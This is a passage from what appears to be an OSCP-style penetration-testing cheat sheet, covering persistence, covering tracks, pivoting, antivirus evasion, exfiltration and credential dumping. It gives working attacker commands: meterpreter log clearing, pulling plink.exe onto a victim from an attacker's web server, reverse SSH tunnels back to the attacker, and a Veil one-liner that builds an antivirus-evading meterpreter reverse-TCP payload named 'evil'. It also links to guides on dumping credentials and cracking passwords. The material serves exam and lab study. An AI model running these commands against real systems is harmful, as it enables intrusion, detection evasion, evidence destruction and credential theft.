[Persistence](https://sushant747.gitbooks.io/total-oscp-guide/persistence.html) | [Persistence w Metasploit on Windows 10](https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/) | [PayloadsAllTheThings- Linux Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md) | [PayloadsAllTheThings- Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
	
## 17. Cover Tracks 		*#lol illuminati-mode*
[Clean Up](https://sushant747.gitbooks.io/total-oscp-guide/content/clean_up.html) | [Covering Your Tracks By gimboyd](http://www.dankalia.com/tutor/01005/0100501003.htm)
	
	meterpreter> run clearlogs
	meterpreter> clearev

## 18. Pivoting, Port forwarding and tunneling
[port_forwarding_and_tunneling](https://sushant747.gitbooks.io/total-oscp-guide/port_forwarding_and_tunneling.html) | [visual pivot attack](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#starting-point) | [PayloadsAllTheThings - Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

*Local Forwarding:*	#forward a port from the client machine to the server machine.

	ssh -L 80:victim.com:80 attacker.com		#OpenSSH
	ssh -L 9090:victimIP:445 user@attackerIP	#Port 9090 locally is forwarded to port 445 on victimIP through attackerIP host

*[Remote Forwarding:](https://www.ssh.com/ssh/tunneling/example)*	#outside(public) access to an internal web server. staff working from home, or by an attacker.

	ssh -R 8080:localhost:80 public.example.com
	
*windows portforward [plink.exe:](https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html)*

	cd /usr/share/windows-resources/binaries/ | python3 -m http.server 9000
	PS victim: Invoke-WebRequest -Uri http://10.10.10.160:9000/plink.exe -OutFile plink.exe	
	#plink.exe -l <kali_user> -pw <kali_passwd> <kaliIP> <-R bind to lport>:127.0.0.1:<rport>
	cmd victim: plink.exe -l root -pw kalipasswd 192.168.0.101 -R 8080:127.0.0.1:8080

*[meterpreter portforward:](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-port-forwarding)* | [metasploitable-3-meterpreter-port-forwarding](https://ultimatepeter.com/metasploitable-3-meterpreter-port-forwarding/)
	
	portfwd add -l <kali port> -p <victim port> -r <victim ip>	
	portfwd add -l 3306 -p 3306 -r 10.10.10.180			#mySQL portforward ##portforwarding
	nc 127.0.0.1 3306 | mysql -u root 127.0.0.1			#can access this port on our machine locally
	portfwd flush							#delete all port forwards
	portfwd list							#list active port forwards
	
*[sshuttle](https://github.com/sshuttle/sshuttle) (linux):*

	#forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling. 
	sshuttle -r root@kaliIP 10.10.10.0/24
	
	
## 19. AV Evasion 		*#lol illuminati-mode*

**[Veil:](https://github.com/Veil-Framework/Veil)** 			

	cd /usr/share/veil; sudo ./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444 -o evil   #veil one liner, output at /var/lib/veil/output/compiled/
	
## 20. Exfiltration | Password Cracking | Wordlists

- [exfiltration](https://book.hacktricks.xyz/untitled#copy-and-paste-base64)
- [PayloadsAllTheThings - Using Windows credentials](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md) - u got credential or hashes?? now u can login to victim
- [CrackStation's Password Cracking Dictionary](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [List of Rainbow Tables](https://project-rainbowcrack.com/table.htm)
- [Rocktastic Mega Wordlist](https://labs.nettitude.com/tools/rocktastic/)

## 21. Credential Dumping

- [Phishing Windows Credentials](https://www.hackingarticles.in/credential-dumping-phishing-windows-credentials/)
- [Wireless](https://www.hackingarticles.in/credential-dumping-wireless/)
- [NTDS.dit](https://www.hackingarticles.in/credential-dumping-ntds-dit/)
- [Group Policy Preferences](https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/)
- [Windows Credential Manager](https://www.hackingarticles.in/credential-dumping-windows-credential-manager/)
- [SAM](https://www.hackingarticles.in/credential-dumping-sam/)
